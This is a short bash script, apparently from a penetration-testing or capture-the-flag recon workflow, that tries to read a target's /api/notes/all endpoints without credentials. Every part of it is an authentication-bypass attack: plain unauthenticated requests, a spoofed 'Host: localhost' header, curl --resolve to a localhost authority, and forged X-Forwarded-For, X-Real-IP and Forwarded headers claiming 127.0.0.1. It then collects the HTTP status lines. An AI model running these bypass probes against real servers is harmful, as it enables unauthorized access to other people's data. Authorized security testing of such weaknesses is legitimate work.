#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
PORT=${2:?PORT}
TO=${3:-8}
OUT_DIR=${4:-/workspace/recon/httpx}
DIR="$OUT_DIR/bypass_noauth_${IP}_${PORT}"
mkdir -p "$DIR"
BASE="http://$IP:$PORT"
paths=(/api/notes/all /api/notes?all=1)
# 1) Plain without Authorization
for p in "${paths[@]}"; do
  name="plain_$(echo "$p"|tr -cd 'A-Za-z0-9')"
  curl -fsS -m "$TO" --connect-timeout "$TO" --path-as-is -i "$BASE$p" > "$DIR/${name}.head" 2>/dev/null || true
done
# 2) Host: localhost without Authorization
for p in "${paths[@]}"; do
  name="hostloc_$(echo "$p"|tr -cd 'A-Za-z0-9')"
  curl -fsS -m "$TO" --connect-timeout "$TO" --path-as-is -i -H 'Host: localhost' "$BASE$p" > "$DIR/${name}.head" 2>/dev/null || true
done
# 3) --resolve localhost authority (no Authorization)
for p in "${paths[@]}"; do
  name="resolve_$(echo "$p"|tr -cd 'A-Za-z0-9')"
  curl -fsS -m "$TO" --connect-timeout "$TO" --resolve "localhost:$PORT:$IP" --path-as-is -i "http://localhost:$PORT$p" > "$DIR/${name}.head" 2>/dev/null || true
done
# 4) X-Forwarded-* tricks (no Authorization)
for p in "${paths[@]}"; do
  name="xff_$(echo "$p"|tr -cd 'A-Za-z0-9')"
  curl -fsS -m "$TO" --connect-timeout "$TO" --path-as-is -i \
    -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'Forwarded: for=127.0.0.1;host=localhost;proto=http' \
    "$BASE$p" > "$DIR/${name}.head" 2>/dev/null || true
done
# Show statuses
rg -n "^HTTP/1\\.[01] [0-9]{3}" -S "$DIR" | sed -n '1,200p' || true
